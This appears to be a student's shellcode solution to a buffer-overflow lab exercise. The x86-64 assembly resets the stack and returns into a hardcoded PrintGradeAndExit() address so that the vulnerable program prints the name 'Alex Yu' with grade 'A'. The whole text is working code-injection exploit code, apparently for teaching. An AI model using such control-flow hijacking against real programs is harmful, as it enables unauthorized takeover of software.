shellcode:
    leaq shellcode-0x100(%rip), %rsp
    leaq name(%rip), %rdi
    leaq grade(%rip), %rsi
    pushq $0x400c30 # hardcoded address of PrintGradeAndExit(), obtained via objdump
    retq
name:
    .asciz "Alex Yu"
grade:
    .asciz "A"
